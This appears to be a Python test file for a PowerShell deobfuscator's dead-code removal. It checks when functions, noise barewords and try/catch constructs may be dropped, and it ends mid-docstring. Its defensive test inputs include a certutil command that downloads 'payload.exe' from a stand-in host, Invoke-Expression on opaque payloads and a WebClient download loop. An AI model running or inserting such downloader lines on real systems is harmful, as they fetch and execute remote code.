from __future__ import annotations

import unittest

from inspect import cleandoc

from test import wontfix
from test.lib.scripts.ps1.deobfuscation import TestPs1

from refinery.lib.scripts.ps1.ast import get_command_name
from refinery.lib.scripts.ps1.model import Ps1CommandInvocation
from refinery.lib.scripts.ps1.parser import Ps1Parser

#: An acting statement that is never a removal candidate, so its survival says only that the pass
#: did not empty the script wholesale.
_ANCHOR = "Write-Host 'ANCHOR_SURVIVES'"


class TestPs1TheSuccessVariableObservesACallThatRan(TestPs1):
    """
    Every command that runs writes `$?`, so a call whose own output nobody reads is still observable
    to a later read of that variable. `Ps1CommandModel.reads_command_success` answers whether the
    script holds one, and the pass that removes an inert function together with its calls keeps the
    group whole where it does.
    """

    def test_a_call_removed_between_a_failure_and_a_read_of_the_success_variable_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            Write-Error 'e'
            K
            Write-Host $?
        """)

    def test_the_same_call_is_removed_where_nothing_reads_the_success_variable(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            Write-Error 'e'
            K
            {_ANCHOR}
        """, F"""
            Write-Error 'e'
            {_ANCHOR}
        """)


class TestPs1TheFunctionDriveObservesADefinition(TestPs1):
    """
    `$function:K` reads the function table through the variable namespace and reports the body bound
    to the name, so a script reading it sees a definition removed from under it.
    `Ps1CommandModel.function_drive_reads` collects that read and the inert-definition removal keeps
    the group whole where it names a defined function; the provider-path spelling reaches the same
    fact through `touches_identity_provider`, which opens the whole world rather than naming the one
    function.
    """

    def test_a_definition_a_function_drive_read_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)

    def test_a_definition_an_item_cmdlet_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host (Get-Item function:K)
        """)

    def test_a_function_drive_read_keeps_only_the_name_it_reports_on(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            function Z {{ }}
            Z
            Write-Host $function:K
        """, F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)


class TestPs1ACommandTableReaderObservesADefinitionItNames(TestPs1):
    """
    `Get-Command` writes a `CommandNotFoundException` to the error stream when a name it was given
    literally matches nothing, and writes nothing at all when a pattern matches nothing. Removing a
    definition a literal read names therefore adds an error record the input never wrote, and
    removing one only a pattern could have matched adds nothing.
    """

    @unittest.expectedFailure
    def test_a_definition_a_literal_read_names_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_written_below_the_read_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            $Null = (Get-Command K).Name
            function K {{ }}
            K
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_only_a_pattern_could_match_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function vnMTH {{ }}
            vnMTH
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """)


class TestPs1ACallAboveItsDefinitionNamesNoCommand(TestPs1):
    """
    A `function` statement binds its name when it runs, so a call written above it resolves against
    whatever stood there before — nothing, in a script that defines the name once. 5.1 answers such
    a call with a `CommandNotFoundException`, which fails without ending the script and leaves `$?`
    at false, so a later read of `$?` observes the failure. Removing the call lets that read report
    the success that stood before it.
    """

    def test_a_call_written_above_the_only_definition_of_its_name_is_kept(self):
        self._assertKept(F"""
            K
            function K {{ }}
            Write-Host $?
        """)

    def test_a_call_written_below_the_definition_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AStoredBlockRendersTheStatementsInIt(TestPs1):
    """
    PowerShell renders a `ScriptBlock` as its own source text, so what a script prints when it writes
    one out is the statements standing in it. A call inside a stored block is therefore not only a
    call: deleting it changes what the block renders as.
    """

    @unittest.expectedFailure
    def test_a_call_inside_a_block_the_script_writes_out_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $b = {{ K }}
            Write-Host $b
        """)

    def test_a_block_the_script_writes_out_keeps_a_statement_that_acts(self):
        self._assertKept(F"""
            $b = {{ {_ANCHOR} }}
            Write-Host $b
        """)


class TestPs1AWorkflowBindsTheNameAFunctionBinds(TestPs1):
    """
    `workflow K { }` and `configuration K { }` write the same table `function K { }` writes, so a
    script holding both binds the name twice and a call reaches the later binding. The call graph
    reads the keyword definition beside the `function`, so the acting keyword body keeps the call
    the inert `function` alone would have dropped.
    """

    def test_a_call_a_workflow_of_the_same_name_claims_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            workflow K {{ Write-Host 'P' }}
            K
        """)


class TestPs1AnAliasAttributeBindsASecondNameForTheFunction(TestPs1):
    """
    An `[Alias]` attribute on a function's `param` block binds a second command name for that
    function when the definition runs, with no aliasing cmdlet standing in the script. A call under
    that second name is a reference to the definition, so removing the definition leaves the call
    naming nothing.
    """

    def test_a_definition_called_under_its_attribute_alias_is_kept(self):
        self._assertKept(F"""
            function K {{ [Alias('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_the_attribute_suffixed_spelling_binds_the_name_too(self):
        self._assertKept(F"""
            function K {{ [AliasAttribute('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_the_namespace_qualified_spelling_binds_the_name_too(self):
        self._assertKept(F"""
            function K {{ [System.Management.Automation.AliasAttribute('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_a_definition_with_no_attribute_alias_is_removed_with_its_call(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param() }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_an_alias_on_a_parameter_names_the_parameter_not_the_command(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([Alias('q')]$x) }}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AParameterDefaultIsConvertedUnderItsTypeConstraint(TestPs1):
    """
    Binding a parameter runs the conversion its type constraint names, so a default value that does
    not convert makes every call raise `ParameterBindingArgumentTransformationException` before the
    body runs. A body read as inert says nothing about that, because the fault is the binder's.
    """

    def test_a_call_whose_parameter_default_does_not_convert_is_kept(self):
        self._assertKept(F"""
            function K {{ param([int] $x = 'abc') }}
            K
            {_ANCHOR}
        """)

    def test_a_call_whose_parameter_default_converts_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([int] $x = '42') }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_call_whose_parameter_carries_no_type_constraint_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param($x = 'abc') }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ADefinitionReachedUnderASpellingTheWalkDoesNotFileUnderIt(TestPs1):
    """
    A call keyed under one name can resolve onto a definition keyed under another: the implicit
    `Get-` retry reaches `Get-Language` from a bare `language`, and a built-in alias reaches
    `Measure-Object` from `measure`. The definition is live in both, and the call graph files each
    call under the spelling it was written with, so what keeps the definition is the collision row
    rather than the call sites.
    """

    def test_a_definition_the_implicit_get_retry_reaches_is_kept(self):
        self._assertKept(F"""
            function Get-Language {{ }}
            language
            {_ANCHOR}
        """)

    def test_a_definition_a_builtin_alias_reaches_is_kept(self):
        self._assertDeobfuscatesTo("""
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | measure
        """, """
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | Measure-Object
        """)


class TestPs1AnIdentityNamespaceAssignmentRebindsTheNameItSpells(TestPs1):
    """
    `${function:q} = { }` binds a command name without writing a `function` statement, so a call
    below it does not reach the `function` definition standing above. The assignment leaves the type
    world closed, since its body stands in the tree, and what keeps the pair is
    `refinery.lib.scripts.ps1.analysis.callgraph.binds_command_identity`.
    """

    def test_a_definition_an_identity_assignment_rebinds_is_kept(self):
        self._assertDeobfuscatesTo("""
            function q { }
            ${function:q} = { Write-Host 'P' }
            q
        """, """
            function q { }
            $function:q = { Write-Host 'P' }
            q
        """)

class TestPs1ADefinitionCodeTheWalkCannotReadMayReachIsKept(TestPs1):
    """
    A definition is removable only where this tree is the whole story about who reaches its name.
    Four things say it is not, and each keeps an inert definition that every other rule would drop:
    a leak whose payload the analysis cannot read, an opaque dispatch, an export, and a definition
    no visible call site reaches at all. Deleting any of them under one of these is what the pass
    refuses today.
    """

    def test_a_definition_no_visible_call_site_reaches_is_kept_beside_a_leak(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
        """)

    def test_a_definition_and_its_call_are_kept_beside_a_leak(self):
        self._assertKept("""
            function K { }
            K
            Invoke-Expression $q
        """)

    def test_a_definition_shadowing_a_cmdlet_is_kept_beside_a_leak(self):
        self._assertKept("""
            function Get-Date { }
            Get-Date
            Invoke-Expression $q
        """)

    def test_a_definition_and_its_call_are_kept_beside_an_opaque_dispatch(self):
        self._assertKept("""
            function K { }
            K
            & $f
        """)

    def test_a_definition_and_its_call_are_kept_beside_an_export(self):
        self._assertKept("""
            function K { }
            K
            Export-ModuleMember -Function K
        """)

class TestPs1ALeakAboveADefinitionCanRebindTheNameItBinds(TestPs1):
    """
    Code the analysis cannot read may bind an alias for a name this script defines as a function,
    and an alias beats a function whichever of the two was bound first. A leak standing *above* the
    definition is therefore as much a reason to keep the pair as one standing between the definition
    and its call. All three orderings are written out because only the middle one is caught by asking
    what stands between.
    """

    def test_a_definition_and_its_call_below_a_leak_are_kept(self):
        self._assertKept("""
            Invoke-Expression $q
            function K { }
            K
        """)

    def test_a_definition_and_its_call_around_a_leak_are_kept(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
            K
        """)

    def test_a_definition_and_its_call_above_a_leak_are_kept(self):
        self._assertKept("""
            function K { }
            K
            Invoke-Expression $q
        """)

class TestPs1ADefinitionMayShadowOneBoundWhereTheWalkCannotSee(TestPs1):
    """
    Removing a definition does not unbind its name. Where code the analysis cannot read has bound
    the same name first, the removal uncovers that binding, so the emitted script runs a body the
    input never reached — which is a different and larger thing than a call to a name nothing
    defines. Resolving the strings is what makes it reachable here rather than hypothetical.
    """

    @unittest.expectedFailure
    def test_a_definition_shadowing_one_an_inlined_string_bound_is_kept(self):
        self._assertKept("""
            $env:B = 'function K { Write-Host P }'
            Invoke-Expression $env:B
            function K { 42 }
            $x = K
            Write-Output $x
            $env:C = 'K'
            Invoke-Expression $env:C
        """)

class TestPs1ARaiseAbandonsTheStatementsBelowItInTheSameBlock(TestPs1):
    """
    A bareword carrying an assignment marker is the shape an obfuscator pads with, and 5.1 answers it
    with `CommandNotFoundException`. Dropping it rests on the claim that it raised — so a statement
    it would have skipped cannot be carried out of the block with it, and a call written above the
    `function` that defines its name raises before that definition has run.

    Both are written with a bare value rather than a call, because a call is not fault-free and the
    pass refuses to carry one whatever the world says: the defect is only reachable through the
    statements it does carry.
    """

    def test_a_value_below_a_dropped_noise_bareword_is_not_carried_out_of_the_try(self):
        self._assertKept("""
            function f { try { zzq0000=5; 'tail' } catch {} }
            Write-Host (f)
        """)

    def test_the_same_value_with_no_raise_above_it_is_carried(self):
        self._assertDeobfuscatesTo("""
            function f { try { 'tail' } catch {} }
            Write-Host (f)
        """, "Write-Host 'tail'")

    def test_a_noise_bareword_alone_in_the_try_dissolves_the_construct(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000=5
            } catch {}
            'next'
        """, "'next'")

    def test_a_call_above_the_definition_of_its_name_is_not_folded_to_the_body(self):
        self._assertKept("""
            zzqfoo1
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """)

    def test_a_call_below_the_definition_is_folded_to_the_body(self):
        self._assertDeobfuscatesTo("""
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """, "'boom'")

    def test_a_call_reached_only_through_a_later_invocation_is_folded(self):
        self._assertDeobfuscatesTo("""
            function A { zzqfoo1 }
            function zzqfoo1 { 'boom' }
            A
        """, "'boom'")

class TestPs1TheHandlerAroundANoiseBarewordHasToMatchIt(TestPs1):
    """
    Dropping a noise bareword rests on its `CommandNotFoundException` landing in a handler that
    swallows it, so the construct needs a clause that takes every error. An empty body is not that
    answer: a clause whose type filter misses has an empty body and takes nothing, a `try` with no
    `catch` at all takes nothing either, and at script scope the error then ends the run. Even where
    a clause does match the run continues, which is what the class below asks about instead. A
    `trap` that resumes past the bareword is the reason the run survived it and is answered here.
    """

    def test_a_noise_bareword_under_a_catch_that_cannot_match_is_kept(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} catch [System.IO.IOException] {{}}
            {_ANCHOR}
        """)

    def test_a_noise_bareword_under_a_try_with_no_catch_at_all_is_kept(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} finally {{
              Write-Host 'FIN'
            }}
            {_ANCHOR}
        """)

    @unittest.expectedFailure
    def test_a_trap_that_resumes_past_a_noise_bareword_is_kept(self):
        self._assertKept(F"""
            trap {{ continue }}
            zzqq0 =5
            {_ANCHOR}
        """)

    def test_a_trap_whose_body_acts_is_kept(self):
        self._assertKept(F"""
            trap {{
              Write-Host 'TRAPPED'
              continue
            }}
            zzqq0 =5
            {_ANCHOR}
        """)

    def test_a_noise_bareword_under_a_catch_that_matches_everything_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ANoiseBarewordIsKeptWhereTheRecordItLeavesIsRead(TestPs1):
    """
    A handler that matches keeps the run alive; it does not unwrite what the raise wrote. `$Error`
    grows an entry, `$?` goes false and `$StackTrace` is filled, so a script reading any of them
    reads a different answer once the statement is gone.

    A read the script hides in a payload has no variable node to be found by until the payload is
    inlined, and the drop is taken first — so the names are looked for in text as well, by the
    spelling that makes them a read rather than by the word. What that costs is stated here rather
    than left to be discovered: a script that only *prints* `'$Error.Count'` reads nothing and is
    kept anyway. What it does not reach is a payload nothing decodes, which is
    `TestPs1ANoiseBarewordIsDroppedAboveAPayloadTheWalkCannotRead` below.

    The `expectedFailure` row below is that defect, and scanning text is not what would fix it.
    The drop is decided in the `fold` group and `Invoke-Expression` is inlined in `finalize`, so the
    question is asked while the read is still a string held in a variable. A scan reaches the
    spellings that survive as one literal and misses every one cut between two of them; measured, a
    payload assembled from `'$Err' + 'or.Count'`, or through a variable an earlier pass has not yet
    folded away, comes out with `$Error` standing in the output beside the deleted statement that
    filled it. A `[char[]]` payload is not one of them: `read` pins the cast over a literal, so
    `-join` folds the whole name to a single string in the `fold` group where the scan reaches it.

    Deciding a removal on an absence — no read found — before the passes that make reads appear have
    finished is not this recognizer's mistake alone, and closing it here would fix one member of a
    family: `refinery.lib.scripts.ps1.deobfuscation.deadcode._is_injected_noise_bareword` says as
    much about `$Error` itself, naming `refinery.lib.scripts.ps1.deobfuscation.removal.Ps1RemovalPlan`
    as where the general answer belongs. Every other statement remover in the package asks its own
    absence question, and whether any of them is asked too early is unmeasured.

    A read spelled through the cmdlet that names the variable — `$v = Get-Variable Error` — is a
    read too: `reads_the_error_record` reads the name a command addresses as a string, so a spelling
    that stores the result first is a read all the same.
    """

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_error_list(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_success_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $?
        """)

    def test_a_noise_bareword_is_kept_where_the_stack_trace_is_read(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $StackTrace
        """)

    def test_a_noise_bareword_is_kept_where_the_read_arrives_through_a_resolved_payload(self):
        self._assertDeobfuscatesTo("""
            $zzqc = '$Error.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $zzqc
        """, """
            $zzqc = '$Error.Count'
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_in_a_payload_nothing_resolves(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND '$Error.Count'
        """)

    @unittest.expectedFailure
    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_across_two_strings(self):
        """
        The passes join the two strings and the expected output is the resolved read, so this is a
        payload the tool *does* decode — it is decoded after the drop rather than before it.
        """
        self._assertDeobfuscatesTo("""
            $zzqa = '$Err'
            $zzqb = 'or.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression ($zzqa + $zzqb)
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_built_out_of_characters(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            $zzqc = -join [char[]](36, 69, 114, 114, 111, 114, 46, 67, 111, 117, 110, 116)
            Invoke-Expression $zzqc
        """, """
            try {
              zzqq0 =5
            } catch {}
            $zzqc = '$Error.Count'
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_get_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Variable Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_the_variable_drive(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Item Variable:Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_that_same_read_is_resolved_to_the_variable(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host (Get-Variable Error).Value.Count
        """, """
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    def test_a_noise_bareword_beside_a_message_that_only_prints_the_name_is_kept_as_well(self):
        self._assertKept(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$Error.Count'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_message_that_says_the_word_without_the_sigil_is_removed(
        self
    ):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host 'an error occurred'
            {_ANCHOR}
        """, F"""
            Write-Host 'an error occurred'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_longer_name_sharing_the_prefix_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """, F"""
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """)


class TestPs1ANoiseBarewordIsAnsweredWhereItStands(TestPs1):
    """
    A `function` statement binds its name when it runs, so the same bareword answers differently
    above and below it: above, it names nothing and raises into the empty handler, and below, it
    calls the function with `=5` as an argument. The trust gate asks where the script rebinds a
    command name and not merely whether, so the two get the two answers.
    """

    def test_a_noise_bareword_above_a_definition_of_its_own_name_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000 =5
            } catch {}
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """, """
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """)

    def test_a_noise_bareword_below_the_definition_is_kept(self):
        self._assertKept("""
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
            try {
              zzq0000 =5
            } catch {}
        """)


class TestPs1ANoiseBarewordIsDroppedAboveAPayloadTheWalkCannotRead(TestPs1):
    """
    A payload this cannot decode is not evidence that the statements above it do anything, so the
    guess is made over them and the leak below is not a reason to refuse. Refusing on its mere
    presence would veto every noise-bareword removal below one, and on the motivating sample every
    noise bareword stands above one.

    What it costs is unobservable only where the payload really is opaque. Measured on 5.1,
    `$Error.Clear(); try { zzqq0 =5 } catch {}; Write-Host $Error.Count` writes 1 where the same
    script without the construct writes 0, so a payload reading `$Error.Count` sees a different
    number than the input gave it. The rows here hand the payload to the host through a name this
    never learns, so no reading of the input decides what they run.

    Where the read *is* visible the removal has to refuse, which is
    `TestPs1ANoiseBarewordIsKeptWhereTheRecordItLeavesIsRead` above — and its two `expectedFailure`
    rows are the boundary this class does not own: a payload the passes decode into the output,
    whose spelling the scan misses because the sigil and the name never stand in one literal. Those
    are wrong answers rather than the half no gate can cover.
    """

    def test_a_noise_bareword_above_an_environment_payload_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')

    def test_a_noise_bareword_above_a_dispatch_through_a_name_it_cannot_read_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND 'arg'
        """, "& $env:ZZQCOMMAND 'arg'")

    def test_a_noise_bareword_above_a_visible_read_of_the_error_list_is_kept(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
            Write-Host $Error.Count
        """)


class TestPs1AProgramOnThePathIsSpelledLikeANoiseBareword(TestPs1):
    """
    `certutil` is in none of the tables the guess consults, so by name alone a downloader cannot be
    told from injected padding, and the `=` marker is the only thing that separates them. Both rows
    are the shape a downloader is written in, one of them carrying an argument that begins with `=`,
    and both have to survive.

    `test_deadcode.TestPs1NoiseBarewordSpellings` asks the same of a closed-world script, where the
    trust gate grants and the marker answers alone. These are the open-world counterpart, and the
    marker answers alone here too: the trust gate is asked at the position, and a bareword written
    above the leak is one it grants. Both rows here survive on their argument lists, so the row below
    carries the shape that has only the marker left between it and deletion.
    """

    def test_a_downloader_whose_arguments_carry_no_marker_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f http://host/payload.exe out.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_downloader_whose_marker_sits_in_a_real_argument_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_program_whose_whole_argument_list_is_the_marker_is_dropped_beside_a_leak(self):
        """
        The shape the marker alone decides, held at a name the host really has: one unquoted
        argument beginning with `=` and nothing else, which is what `_carries_assignment_marker`
        was written to accept and what no downloader is spelled as. `certutil` reached this way
        writes its usage to the host and raises nothing, so the drop is a real deletion of output
        and not a refusal of one — it is taken because the marker says padding, and this row is
        where that judgement is recorded rather than inferred from the rows above.
        """
        self._assertDeobfuscatesTo("""
            try {
              certutil =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')


class TestPs1AnErrorNothingTakesInsideATryOrCatchBodySkipsTheRestOfTheTry(TestPs1):
    """
    Measured on 5.1: a statement-terminating error raised in a `try` body or a `catch` body that no
    `trap` and no `catch` takes does not step over to the next statement. It leaves the whole `try`,
    its `finally` runs, and the script carries on after the `try`. The removal passes read it as
    stepping over, so they delete the raise, or the `trap` that resumes past it, and the rest of
    the `try` runs where 5.1 skips it, or is skipped where 5.1 runs it.
    """

    def test_a_cast_that_fails_in_a_try_body_without_a_catch_is_kept(self):
        """
        5.1 writes the cast's error and `after`; the output writes `rest` and `after`.
        """
        self._assertKept("""
            try {
              $Null = [int]'a'
              Write-Host 'rest'
            } finally {}
            Write-Host 'after'
        """)

    def test_a_cast_that_fails_in_a_catch_body_is_kept(self):
        """
        5.1 writes the cast's error and `after`; the output writes `c-rest` and `after`.
        """
        self._assertKept("""
            try {
              throw 'x'
            } catch {
              $Null = [int]'a'
              Write-Host 'c-rest'
            }
            Write-Host 'after'
        """)

    def test_a_trap_that_resumes_inside_a_try_body_without_a_catch_is_kept(self):
        """
        5.1 writes `rest ` and `after`; without the `trap` it writes the cast's error and `after`.
        """
        self._assertKept("""
            try {
              trap {
                continue
              }
              $v = [int]'a'
              Write-Host "rest ${v}"
            } finally {}
            Write-Host 'after'
        """)


class TestPs1ARaiseAResumingTrapSkipsPastIsKept(TestPs1):

    def test_a_cast_whose_trap_resumes_past_the_rest_of_its_block_is_kept(self):
        """
        5.1 writes `after`: the `trap` resumes past the `if`. The output deletes the cast and writes
        `t` and `after`.
        """
        output = self._deobfuscate(cleandoc("""
            trap {
              continue
            }
            if ((Get-Date).Year -gt 2000) {
              $v = [int]'a'
              Write-Host 't'
            }
            Write-Host 'after'
        """))
        self.assertIn("[int]'a'", output)


class TestPs1ACallMeasuredNeverToFailSkipsNothing(TestPs1):
    """
    Measured on 5.1: `[Math]::Sqrt` of a number, `[array]::Reverse` of a list written out and
    `Get-Random` handed nothing never fail, and neither does `GetHashCode` on the number it hands
    back. A call that cannot fail skips nothing, so in a `catch` body it is junk like anywhere else;
    the same call handed anything else may fail and skip the rest of the body, and stays.
    """

    def test_calls_that_cannot_fail_go_from_a_catch_body(self):
        self._assertDeobfuscatesTo("""
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                $k = [Math]::Sqrt(36)
                (Get-Random).GetHashCode() | Out-Null
                $r = [array]::Reverse((1, 2, 3, 4))
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """, """
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_call_handed_a_value_no_fact_covers_stays_in_a_catch_body(self):
        self._assertKept("""
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                $Null = [Math]::Sqrt($s)
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_random_number_stays_where_the_script_binds_default_parameter_values(self):
        """
        5.1 fails a bare `Get-Random` once `Get-Random:Maximum` is bound to 0.
        """
        self._assertKept("""
            $PSDefaultParameterValues['Get-Random:Maximum'] = 0
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                (Get-Random).GetHashCode() | Out-Null
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_store_above_a_call_that_cannot_fail_is_overwritten_below_it(self):
        self._assertDeobfuscatesTo("""
            try {
              throw 'x'
            } catch {
              $x = 'two'
              $k = [Math]::Sqrt(36)
              $x = 'three'
            }
            Write-Host $x
        """, """
            Write-Host 'three'
        """)

    def test_a_trap_over_a_catch_body_that_cannot_fail_goes(self):
        self._assertDeobfuscatesTo("""
            try {
              throw 'x'
            } catch {
              trap { continue }
              $b = Get-Random
              Write-Host 'a'
            }
            Write-Host 'end'
        """, """
            Write-Host 'a'
            Write-Host 'end'
        """)


class TestPs1AFailingTestOrCollectionSkipsTheRestOfTheBody(TestPs1):
    """
    Measured on 5.1: the test of an `if`, `elseif`, `while`, `do` or `for`, the collection a
    `foreach` enumerates, and the subject, a clause condition and a malformed `-Regex` or
    `-Wildcard` pattern of a `switch` fail the way a statement does, and a failure in a `try` or
    `catch` body skips the rest of that body. Each shape is kept whole.
    """

    def test_a_failing_test_keeps_a_catch_body_from_being_run_in_place_of_its_try(self):
        self._assertKept("""
            $x = 'one'
            try {
              throw 'q'
            } catch {
              $x = 'two'
              if ([int]'a') {}
              $x = 'three'
            }
            Write-Host $x
        """)

    def test_a_failing_test_collection_or_subject_skips_the_rest_of_the_catch_body(self):
        for construct in (
            "foreach ($i in [int]'a') {}",
            "switch ([int]'a') {\n    1 {}\n  }",
            "while ([int]'a') {}",
            "for (; [int]'a'; ) {}",
            "do {} while ([int]'a')",
        ):
            with self.subTest(construct):
                self._assertKept(F"""
                    try {{
                      throw 'x'
                    }} catch {{
                      {construct}
                      Write-Host 'rest'
                    }}
                    Write-Host 'after'
                """)

    def test_a_failing_clause_condition_or_pattern_skips_the_rest_of_the_catch_body(self):
        for construct in (
            "switch (1) {\n    ([int]'a') {}\n  }",
            "switch -Regex ('a') {\n    '[' {}\n  }",
            "switch -Wildcard ('a') {\n    '[' {}\n  }",
        ):
            with self.subTest(construct):
                self._assertKept(F"""
                    try {{
                      throw 'x'
                    }} catch {{
                      {construct}
                      Write-Host 'rest'
                    }}
                    Write-Host 'after'
                """)

    @wontfix('no obfuscator enumerates into a variable whose type it constrained before')
    def test_a_loop_variable_whose_type_is_constrained_skips_the_rest_of_the_catch_body(self):
        """
        Measured on 5.1: `foreach` stores every item it enumerates through the type its variable is
        constrained to, and an item that does not convert fails the loop.
        """
        self._assertKept("""
            [int]$i = 0
            try {
              throw 'x'
            } catch {
              foreach ($i in 'a') {}
              Write-Host 'rest'
            }
            Write-Host 'after'
        """)

    def test_a_store_above_a_failing_test_is_the_one_read_after_the_try(self):
        self._assertKept("""
            try {
              $x = 'one'
              if ([int]'a') {}
              $x = 'two'
            } finally {}
            Write-Host $x
        """)


class TestPs1AFailingLineInAnArrayExpressionSkipsTheRestOfTheBody(TestPs1):
    """
    Measured on 5.1: a line failing inside an `@( )` in a `try` or `catch` body skips the rest of
    that body, so the statement holding the `@( )` is a failing line however unused its value is.
    """

    def test_the_statement_and_the_store_above_it_are_kept(self):
        self._assertKept("""
            $x = 'one'
            try {
              $x = 'two'
              $y = @([int]'a')
              $x = 'three'
            } catch [System.IO.IOException] {}
            Write-Host $x
        """)

    def test_the_rest_of_the_catch_body_is_kept_from_running(self):
        self._assertKept("""
            try {
              throw 'x'
            } catch {
              $y = @([int]'a')
              Write-Host 'rest'
            }
            Write-Host 'after'
        """)


class TestPs1AThrowCarriesOnWhereTheScriptMaySilenceErrors(TestPs1):
    """
    Measured on 5.1: once `$ErrorActionPreference` holds `SilentlyContinue`, however the script
    wrote it, a `throw` nothing takes is stepped over, and `-ErrorAction SilentlyContinue` on an
